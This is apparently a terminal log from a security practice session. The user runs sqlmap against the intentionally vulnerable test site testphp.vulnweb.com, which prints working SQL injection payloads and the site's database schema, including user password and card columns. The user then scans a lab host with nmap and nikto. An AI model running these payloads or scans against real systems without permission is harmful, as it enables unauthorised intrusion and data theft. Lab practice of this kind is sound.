@@ -1,0 +1,777 @@
+The authenticity of host '192.168.38.131 (192.168.38.131)' can't be established.
+ECDSA key fingerprint is SHA256:6xmk0RAj7OJ1DNsLjjsMqFgaD12yFNJkUkgdXEXUCos.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '192.168.38.131' (ECDSA) to the list of known hosts.
+ubuntu@192.168.38.131's password:
+Permission denied, please try again.
+ubuntu@192.168.38.131's password:
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Mon Dec 16 05:08:57 PM UTC 2024
+
+  System load:  0.14599609375      Processes:              453
+  Usage of /:   25.1% of 28.37GB   Users logged in:        1
+  Memory usage: 14%                IPv4 address for ens33: 192.168.38.131
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+17 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+New release '24.04.1 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+Last login: Mon Dec 16 16:13:07 2024
+ubuntu@ubuntu:~$ sqlmap --version
+1.6.4#stable
+[17:09:20] [WARNING] your sqlmap version is outdated
+ubuntu@ubuntu:~$ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs acuart --columns
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:09:44 /2024-12-16/
+
+[17:09:44] [INFO] resuming back-end DBMS 'mysql'
+[17:09:44] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cat=(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE (SELECT 9228 UNION SELECT 5855) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x71716a7871,(SELECT (ELT(6084=6084,1))),0x71716b6271),6084)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 5903 FROM (SELECT(SLEEP(5)))kJxq)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716a7871,0x4649784a4d737371637965785172794b636778564d557a684e6b6a43716d786f706e6c4254547667,0x71716b6271),NULL-- -
+---
+[17:09:45] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[17:09:45] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[17:09:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
+[17:09:45] [INFO] fetching current database
+[17:09:45] [INFO] fetching tables for database: 'acuart'
+[17:09:45] [INFO] fetching columns for table 'featured' in database 'acuart'
+[17:09:45] [INFO] fetching columns for table 'categ' in database 'acuart'
+[17:09:45] [INFO] fetching columns for table 'products' in database 'acuart'
+[17:09:45] [INFO] fetching columns for table 'guestbook' in database 'acuart'
+[17:09:45] [INFO] fetching columns for table 'users' in database 'acuart'
+[17:09:45] [INFO] fetching columns for table 'pictures' in database 'acuart'
+[17:09:45] [INFO] fetching columns for table 'carts' in database 'acuart'
+[17:09:45] [INFO] fetching columns for table 'artists' in database 'acuart'
+Database: acuart
+Table: featured
+[2 columns]
++--------------+------+
+| Column       | Type |
++--------------+------+
+| feature_text | text |
+| pic_id       | int  |
++--------------+------+
+
+Database: acuart
+Table: categ
+[3 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| cat_id | int         |
+| cdesc  | tinytext    |
+| cname  | varchar(50) |
++--------+-------------+
+
+Database: acuart
+Table: products
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| description | text         |
+| id          | int unsigned |
+| name        | text         |
+| price       | int unsigned |
+| rewritename | text         |
++-------------+--------------+
+
+Database: acuart
+Table: guestbook
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| mesaj    | text         |
+| sender   | varchar(150) |
+| senttime | int          |
++----------+--------------+
+
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| name    | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+Database: acuart
+Table: pictures
+[8 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| a_id   | int          |
+| cat_id | int          |
+| img    | varchar(50)  |
+| pic_id | int          |
+| plong  | text         |
+| price  | int          |
+| pshort | mediumtext   |
+| title  | varchar(100) |
++--------+--------------+
+
+Database: acuart
+Table: carts
+[3 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| cart_id | varchar(100) |
+| item    | int          |
+| price   | int          |
++---------+--------------+
+
+Database: acuart
+Table: artists
+[3 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| adesc     | text        |
+| aname     | varchar(50) |
+| artist_id | int         |
++-----------+-------------+
+
+[17:09:45] [INFO] fetched data logged to text files under '/home/ubuntu/.local/share/sqlmap/output/testphp.vulnweb.com'
+[17:09:45] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 17:09:45 /2024-12-16/
+
+ubuntu@ubuntu:~$ nmap
+Command 'nmap' not found, but can be installed with:
+sudo snap install nmap  # version 7.95, or
+sudo apt  install nmap  # version 7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1
+See 'snap info nmap' for additional versions.
+ubuntu@ubuntu:~$ sudo apt install nmap
+[sudo] password for ubuntu:
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following additional packages will be installed:
+  libblas3 liblinear4 liblua5.3-0 lua-lpeg nmap-common
+Suggested packages:
+  liblinear-tools liblinear-dev ncat ndiff zenmap
+The following NEW packages will be installed:
+  libblas3 liblinear4 liblua5.3-0 lua-lpeg nmap nmap-common
+0 upgraded, 6 newly installed, 0 to remove and 17 not upgraded.
+Need to get 6,113 kB of archives.
+After this operation, 26.8 MB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Get:1 http://ge.archive.ubuntu.com/ubuntu jammy/main amd64 libblas3 amd64 3.10.0-2ubuntu1 [228 kB]
+Get:2 http://ge.archive.ubuntu.com/ubuntu jammy/universe amd64 liblinear4 amd64 2.3.0+dfsg-5 [41.4 kB]
+Get:3 http://ge.archive.ubuntu.com/ubuntu jammy/main amd64 liblua5.3-0 amd64 5.3.6-1build1 [140 kB]
+Get:4 http://ge.archive.ubuntu.com/ubuntu jammy/universe amd64 lua-lpeg amd64 1.0.2-1 [31.4 kB]
+Get:5 http://ge.archive.ubuntu.com/ubuntu jammy-updates/universe amd64 nmap-common all 7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1 [3,940 kB]
+Get:6 http://ge.archive.ubuntu.com/ubuntu jammy-updates/universe amd64 nmap amd64 7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1 [1,731 kB]
+Fetched 6,113 kB in 2s (2,587 kB/s)
+Selecting previously unselected package libblas3:amd64.
+(Reading database ... 75247 files and directories currently installed.)
+Preparing to unpack .../0-libblas3_3.10.0-2ubuntu1_amd64.deb ...
+Unpacking libblas3:amd64 (3.10.0-2ubuntu1) ...
+Selecting previously unselected package liblinear4:amd64.
+Preparing to unpack .../1-liblinear4_2.3.0+dfsg-5_amd64.deb ...
+Unpacking liblinear4:amd64 (2.3.0+dfsg-5) ...
+Selecting previously unselected package liblua5.3-0:amd64.
+Preparing to unpack .../2-liblua5.3-0_5.3.6-1build1_amd64.deb ...
+Unpacking liblua5.3-0:amd64 (5.3.6-1build1) ...
+Selecting previously unselected package lua-lpeg:amd64.
+Preparing to unpack .../3-lua-lpeg_1.0.2-1_amd64.deb ...
+Unpacking lua-lpeg:amd64 (1.0.2-1) ...
+Selecting previously unselected package nmap-common.
+Preparing to unpack .../4-nmap-common_7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1_all.deb ...
+Unpacking nmap-common (7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1) ...
+Selecting previously unselected package nmap.
+Preparing to unpack .../5-nmap_7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1_amd64.deb ...
+Unpacking nmap (7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1) ...
+Setting up lua-lpeg:amd64 (1.0.2-1) ...
+Setting up libblas3:amd64 (3.10.0-2ubuntu1) ...
+update-alternatives: using /usr/lib/x86_64-linux-gnu/blas/libblas.so.3 to provide /usr/lib/x86_64-linux-gnu/libblas.so.3 (libblas.so.3-x86_64-linux-gnu) in auto mode
+Setting up nmap-common (7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1) ...
+Setting up liblua5.3-0:amd64 (5.3.6-1build1) ...
+Setting up liblinear4:amd64 (2.3.0+dfsg-5) ...
+Setting up nmap (7.91+dfsg1+really7.80+dfsg1-2ubuntu0.1) ...
+Processing triggers for man-db (2.10.2-1) ...
+Processing triggers for libc-bin (2.35-0ubuntu3.6) ...
+Scanning processes...
+Scanning linux images...
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+ubuntu@ubuntu:~$ nmap --version
+Nmap version 7.80 ( https://nmap.org )
+Platform: x86_64-pc-linux-gnu
+Compiled with: liblua-5.3.6 openssl-3.0.2 nmap-libssh2-1.8.2 libz-1.2.11 libpcre-8.39 libpcap-1.10.1 nmap-libdnet-1.12 ipv6
+Compiled without:
+Available nsock engines: epoll poll select
+ubuntu@ubuntu:~$ nmap http://testphp.vulnweb.com/
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:18 UTC
+Unable to split netmask from target expression: "http://testphp.vulnweb.com/"
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.03 seconds
+ubuntu@ubuntu:~$ nmap http://testphp.vulnweb.com/
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:18 UTC
+Unable to split netmask from target expression: "http://testphp.vulnweb.com/"
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.03 seconds
+ubuntu@ubuntu:~$ nmap http://testphp.vulnweb.com
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:19 UTC
+Unable to split netmask from target expression: "http://testphp.vulnweb.com"
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.04 seconds
+ubuntu@ubuntu:~$ nmap -p80 http://testphp.vulnweb.com
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:19 UTC
+Unable to split netmask from target expression: "http://testphp.vulnweb.com"
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.03 seconds
+ubuntu@ubuntu:~$ nmap -p80 testphp.vulnweb.com
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:19 UTC
+Nmap scan report for testphp.vulnweb.com (44.228.249.3)
+Host is up (0.24s latency).
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
+ubuntu@ubuntu:~$ nmap testphp.vulnweb.com
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:20 UTC
+Nmap scan report for testphp.vulnweb.com (44.228.249.3)
+Host is up (0.25s latency).
+rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+All 1000 scanned ports on testphp.vulnweb.com (44.228.249.3) are filtered
+
+Nmap done: 1 IP address (1 host up) scanned in 65.99 seconds
+ubuntu@ubuntu:~$ nmap -v 185.212.254.50
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:25 UTC
+Initiating Ping Scan at 17:25
+Scanning 185.212.254.50 [2 ports]
+Completed Ping Scan at 17:25, 3.00s elapsed (1 total hosts)
+Nmap scan report for 185.212.254.50 [host down]
+Read data files from: /usr/bin/../share/nmap
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds
+ubuntu@ubuntu:~$ sudo nmap -v 185.212.254.50
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:27 UTC
+Initiating Ping Scan at 17:27
+Scanning 185.212.254.50 [4 ports]
+Completed Ping Scan at 17:27, 0.02s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 17:27
+Completed Parallel DNS resolution of 1 host. at 17:27, 0.20s elapsed
+Initiating SYN Stealth Scan at 17:27
+Scanning 185.212.254.50 [1000 ports]
+Discovered open port 80/tcp on 185.212.254.50
+Increasing send delay for 185.212.254.50 from 0 to 5 due to 11 out of 14 dropped probes since last increase.
+Increasing send delay for 185.212.254.50 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
+Increasing send delay for 185.212.254.50 from 10 to 20 due to 11 out of 11 dropped probes since last increase.
+Completed SYN Stealth Scan at 17:28, 45.03s elapsed (1000 total ports)
+Nmap scan report for 185.212.254.50
+Host is up (0.00059s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 45.34 seconds
+           Raw packets sent: 2037 (89.468KB) | Rcvd: 1145 (45.804KB)
+ubuntu@ubuntu:~$ sudo nmap -p80 -sV -sC 185.212.254.50
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-16 17:29 UTC
+Nmap scan report for 185.212.254.50
+Host is up (0.00044s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/society
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Why are you here?
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
+ubuntu@ubuntu:~$ sudo apt install nikto
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following additional packages will be installed:
+  libnet-ssleay-perl libwhisker2-perl perl-openssl-defaults
+The following NEW packages will be installed:
+  libnet-ssleay-perl libwhisker2-perl nikto perl-openssl-defaults
+0 upgraded, 4 newly installed, 0 to remove and 17 not upgraded.
+Need to get 679 kB of archives.
+After this operation, 3,612 kB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Get:1 http://ge.archive.ubuntu.com/ubuntu jammy/main amd64 perl-openssl-defaults amd64 5build2 [7,542 B]
+Get:2 http://ge.archive.ubuntu.com/ubuntu jammy/main amd64 libnet-ssleay-perl amd64 1.92-1build2 [327 kB]
+Get:3 http://ge.archive.ubuntu.com/ubuntu jammy/universe amd64 libwhisker2-perl all 2.5-1.2 [98.1 kB]
+Get:4 http://ge.archive.ubuntu.com/ubuntu jammy/multiverse amd64 nikto all 1:2.1.5-3.1 [246 kB]
+Fetched 679 kB in 1s (1,221 kB/s)
+Selecting previously unselected package perl-openssl-defaults:amd64.
+(Reading database ... 76133 files and directories currently installed.)
+Preparing to unpack .../perl-openssl-defaults_5build2_amd64.deb ...
+Unpacking perl-openssl-defaults:amd64 (5build2) ...
+Selecting previously unselected package libnet-ssleay-perl:amd64.
+Preparing to unpack .../libnet-ssleay-perl_1.92-1build2_amd64.deb ...
+Unpacking libnet-ssleay-perl:amd64 (1.92-1build2) ...
+Selecting previously unselected package libwhisker2-perl.
+Preparing to unpack .../libwhisker2-perl_2.5-1.2_all.deb ...
+Unpacking libwhisker2-perl (2.5-1.2) ...
+Selecting previously unselected package nikto.
+Preparing to unpack .../nikto_1%3a2.1.5-3.1_all.deb ...
+Unpacking nikto (1:2.1.5-3.1) ...
+Setting up perl-openssl-defaults:amd64 (5build2) ...
+Setting up libwhisker2-perl (2.5-1.2) ...
+Setting up libnet-ssleay-perl:amd64 (1.92-1build2) ...
+Setting up nikto (1:2.1.5-3.1) ...
+Processing triggers for man-db (2.10.2-1) ...
+Scanning processes...
+Scanning linux images...
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+ubuntu@ubuntu:~$ nikto
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ ERROR: No host specified
+
+       -config+            Use this config file
+       -Display+           Turn on/off display outputs
+       -dbcheck            check database and other key files for syntax errors
+       -Format+            save file (-o) format
+       -Help               Extended help information
+       -host+              target host
+       -id+                Host authentication to use, format is id:pass or id:pass:realm
+       -list-plugins       List all available plugins
+       -output+            Write output to this file
+       -nossl              Disables using SSL
+       -no404              Disables 404 checks
+       -Plugins+           List of plugins to run (default: ALL)
+       -port+              Port to use (default 80)
+       -root+              Prepend root value to all requests, format is /directory
+       -ssl                Force ssl mode on port
+       -Tuning+            Scan tuning
+       -timeout+           Timeout for requests (default 10 seconds)
+       -update             Update databases and plugins from CIRT.net
+       -Version            Print plugin and database versions
+       -vhost+             Virtual host (for Host header)
+                + requires a value
+
+        Note: This is the short help output. Use -H for full help text.
+
+ubuntu@ubuntu:~$ nikto -host 185.212.254.50
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          185.212.254.50
++ Target Hostname:    185.212.254.50
++ Target Port:        80
++ Start Time:         2024-12-16 17:32:58 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x121 0x58cb2e5060e80
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ File/dir '/society/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2024-12-16 17:33:27 (GMT0) (29 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+ubuntu@ubuntu:~$ sudo openssl req -x509 -newkey rsa:4096 -keyout /etc/ssl/private/cyber-cube.local.key -out /etc/ssl/certs/cyber-cube.local.crt -days 365
+..........+....+.........+........+.......+............+...+.....+.+.....+.+......+..+......+................+...+..+.........................+...+..+....+..............+.......+.....+.+...+............+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..+......+......+.+.....+.......+.....+...+..........+...+.........+.....+...+....+.....+....+..+....+......+..+.+...........+...+.+.....+.+.....+.............+..+.+..+......+.......+.....+..........+...+..+....+...........+....+.........+..+...+......+.+..+............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.......+........+.....................+....+...+...+..+...............+...+.........+.+.....+.+.........+...........+.+..+.+..+.......+...+............+...........+....+.....+...+....+.....................+..............+...+.+............+.........+.....+......+.........+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+...+.....+.........+.+......+...+..+.........+.+..+......+....+...+...+.....+......+......+............+...+.......+...+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..+.....+....+......+...+...+...+..+............................+..+....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*......+.........+....+............+......+...+.....+................+...+..+...+...+...............+....+.....+.+...+......+.....+.........+.........+.........................+..+......+.........................+...+...........+.+..+.......+......+..+...+.......+...+........+......+..................+.+..+............+...+...+.......+...+..+....+...+......+......+.........+..+.........+...............+....+.................+....+.........+......+...+.................+....+.....+............+...+.+.....+.+.........+......+............+.....+...+.......+..+......+...+..........+.....+.........+..................+...+.+......+.....+.............+.....................+...+.....+...+..........+..+.......+........+..................+...+.+......+............+...+...+..+.......+...+..+............+.........+.........+............+...............+....+..+...+......+......+...+......+.+........+................+..............+.+......+........+.......+..+.............+..+.+.................+...+..........+..+.........+......+............+...............+.+..............+................+............+.........+...+..+.........+....+...+..+...............+.+......+.........+.....+.+........+.......+......+.....+....+...+..+.............+........+.........+...+..........+......+......+...........+.........+.+.........+........+.+.........+..+.............+...+...............+..+.......+.....+...+.+.........+......+..+..........+...+.....+...................+........+.........+....+..+.........+....+..+....+.........+.........+....................+.......+......+.................+...+...+............+.............+..+...................+...........+..........+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+409791B7F47F0000:error:14000065:UI routines:UI_set_result_ex:result too small:../crypto/ui/ui_lib.c:884:You must type in 4 to 1024 characters
+409791B7F47F0000:error:1400006B:UI routines:UI_process:processing error:../crypto/ui/ui_lib.c:544:while reading strings
+409791B7F47F0000:error:0480006D:PEM routines:PEM_def_callback:problems getting password:../crypto/pem/pem_lib.c:62:
+409791B7F47F0000:error:07880109:common libcrypto routines:do_ui_passphrase:interrupted or cancelled:../crypto/passphrase.c:184:
+409791B7F47F0000:error:1C80009F:Provider routines:p8info_to_encp8:unable to get passphrase:../providers/implementations/encode_decode/encode_key2any.c:116:
+ubuntu@ubuntu:~$ 185.21.254.50 localhost
+185.21.254.50: command not found
+ubuntu@ubuntu:~$ 185.21.254.50 testphp.vulnweb.com
+185.21.254.50: command not found
+ubuntu@ubuntu:~$ ping 185.212.254.50
+PING 185.212.254.50 (185.212.254.50) 56(84) bytes of data.
+64 bytes from 185.212.254.50: icmp_seq=1 ttl=128 time=1.45 ms
+64 bytes from 185.212.254.50: icmp_seq=2 ttl=128 time=0.906 ms
+64 bytes from 185.212.254.50: icmp_seq=3 ttl=128 time=3.95 ms
+64 bytes from 185.212.254.50: icmp_seq=4 ttl=128 time=1.12 ms
+64 bytes from 185.212.254.50: icmp_seq=5 ttl=128 time=1.03 ms
+64 bytes from 185.212.254.50: icmp_seq=6 ttl=128 time=0.925 ms
+64 bytes from 185.212.254.50: icmp_seq=7 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=8 ttl=128 time=1.32 ms
+64 bytes from 185.212.254.50: icmp_seq=9 ttl=128 time=0.957 ms
+64 bytes from 185.212.254.50: icmp_seq=10 ttl=128 time=0.925 ms
+64 bytes from 185.212.254.50: icmp_seq=11 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=12 ttl=128 time=1.11 ms
+64 bytes from 185.212.254.50: icmp_seq=13 ttl=128 time=1.21 ms
+64 bytes from 185.212.254.50: icmp_seq=14 ttl=128 time=1.03 ms
+64 bytes from 185.212.254.50: icmp_seq=15 ttl=128 time=3.96 ms
+64 bytes from 185.212.254.50: icmp_seq=16 ttl=128 time=1.46 ms
+64 bytes from 185.212.254.50: icmp_seq=17 ttl=128 time=1.13 ms
+64 bytes from 185.212.254.50: icmp_seq=18 ttl=128 time=1.13 ms
+64 bytes from 185.212.254.50: icmp_seq=19 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=20 ttl=128 time=1.08 ms
+64 bytes from 185.212.254.50: icmp_seq=21 ttl=128 time=0.847 ms
+64 bytes from 185.212.254.50: icmp_seq=22 ttl=128 time=1.12 ms
+64 bytes from 185.212.254.50: icmp_seq=23 ttl=128 time=4.01 ms
+64 bytes from 185.212.254.50: icmp_seq=24 ttl=128 time=1.14 ms
+64 bytes from 185.212.254.50: icmp_seq=25 ttl=128 time=1.09 ms
+64 bytes from 185.212.254.50: icmp_seq=26 ttl=128 time=1.21 ms
+64 bytes from 185.212.254.50: icmp_seq=27 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=28 ttl=128 time=1.19 ms
+64 bytes from 185.212.254.50: icmp_seq=29 ttl=128 time=0.908 ms
+64 bytes from 185.212.254.50: icmp_seq=30 ttl=128 time=1.32 ms
+64 bytes from 185.212.254.50: icmp_seq=31 ttl=128 time=3.88 ms
+64 bytes from 185.212.254.50: icmp_seq=32 ttl=128 time=1.13 ms
+64 bytes from 185.212.254.50: icmp_seq=33 ttl=128 time=1.11 ms
+64 bytes from 185.212.254.50: icmp_seq=34 ttl=128 time=1.06 ms
+64 bytes from 185.212.254.50: icmp_seq=35 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=36 ttl=128 time=1.25 ms
+64 bytes from 185.212.254.50: icmp_seq=37 ttl=128 time=1.15 ms
+64 bytes from 185.212.254.50: icmp_seq=38 ttl=128 time=1.09 ms
+64 bytes from 185.212.254.50: icmp_seq=39 ttl=128 time=3.97 ms
+64 bytes from 185.212.254.50: icmp_seq=40 ttl=128 time=1.07 ms
+64 bytes from 185.212.254.50: icmp_seq=41 ttl=128 time=1.16 ms
+64 bytes from 185.212.254.50: icmp_seq=42 ttl=128 time=0.941 ms
+64 bytes from 185.212.254.50: icmp_seq=43 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=44 ttl=128 time=1.13 ms
+64 bytes from 185.212.254.50: icmp_seq=45 ttl=128 time=1.20 ms
+64 bytes from 185.212.254.50: icmp_seq=46 ttl=128 time=1.20 ms
+64 bytes from 185.212.254.50: icmp_seq=47 ttl=128 time=3.99 ms
+64 bytes from 185.212.254.50: icmp_seq=48 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=49 ttl=128 time=1.19 ms
+64 bytes from 185.212.254.50: icmp_seq=50 ttl=128 time=1.08 ms
+64 bytes from 185.212.254.50: icmp_seq=51 ttl=128 time=4.03 ms
+64 bytes from 185.212.254.50: icmp_seq=52 ttl=128 time=1.31 ms
+64 bytes from 185.212.254.50: icmp_seq=53 ttl=128 time=0.971 ms
+64 bytes from 185.212.254.50: icmp_seq=54 ttl=128 time=1.71 ms
+64 bytes from 185.212.254.50: icmp_seq=55 ttl=128 time=3.84 ms
+64 bytes from 185.212.254.50: icmp_seq=56 ttl=128 time=1.08 ms
+64 bytes from 185.212.254.50: icmp_seq=57 ttl=128 time=1.11 ms
+64 bytes from 185.212.254.50: icmp_seq=58 ttl=128 time=1.12 ms
+64 bytes from 185.212.254.50: icmp_seq=59 ttl=128 time=1.36 ms
+64 bytes from 185.212.254.50: icmp_seq=60 ttl=128 time=0.977 ms
+64 bytes from 185.212.254.50: icmp_seq=61 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=62 ttl=128 time=1.59 ms
+64 bytes from 185.212.254.50: icmp_seq=63 ttl=128 time=5.15 ms
+64 bytes from 185.212.254.50: icmp_seq=64 ttl=128 time=1.28 ms
+64 bytes from 185.212.254.50: icmp_seq=65 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=66 ttl=128 time=1.05 ms
+64 bytes from 185.212.254.50: icmp_seq=67 ttl=128 time=1.14 ms
+64 bytes from 185.212.254.50: icmp_seq=68 ttl=128 time=1.18 ms
+64 bytes from 185.212.254.50: icmp_seq=69 ttl=128 time=4.00 ms
+64 bytes from 185.212.254.50: icmp_seq=70 ttl=128 time=1.02 ms
+64 bytes from 185.212.254.50: icmp_seq=71 ttl=128 time=0.878 ms
+64 bytes from 185.212.254.50: icmp_seq=72 ttl=128 time=1.11 ms
+64 bytes from 185.212.254.50: icmp_seq=73 ttl=128 time=4.02 ms
+64 bytes from 185.212.254.50: icmp_seq=74 ttl=128 time=0.962 ms
+64 bytes from 185.212.254.50: icmp_seq=75 ttl=128 time=1.12 ms
+64 bytes from 185.212.254.50: icmp_seq=76 ttl=128 time=1.05 ms
+64 bytes from 185.212.254.50: icmp_seq=77 ttl=128 time=1.13 ms
+64 bytes from 185.212.254.50: icmp_seq=78 ttl=128 time=3.95 ms
+64 bytes from 185.212.254.50: icmp_seq=79 ttl=128 time=1.15 ms
+64 bytes from 185.212.254.50: icmp_seq=80 ttl=128 time=1.06 ms
+64 bytes from 185.212.254.50: icmp_seq=81 ttl=128 time=0.955 ms
+64 bytes from 185.212.254.50: icmp_seq=82 ttl=128 time=4.03 ms
+64 bytes from 185.212.254.50: icmp_seq=83 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=84 ttl=128 time=1.01 ms
+64 bytes from 185.212.254.50: icmp_seq=85 ttl=128 time=0.964 ms
+64 bytes from 185.212.254.50: icmp_seq=86 ttl=128 time=4.05 ms
+64 bytes from 185.212.254.50: icmp_seq=87 ttl=128 time=0.951 ms
+64 bytes from 185.212.254.50: icmp_seq=88 ttl=128 time=1.39 ms
+64 bytes from 185.212.254.50: icmp_seq=89 ttl=128 time=1.26 ms
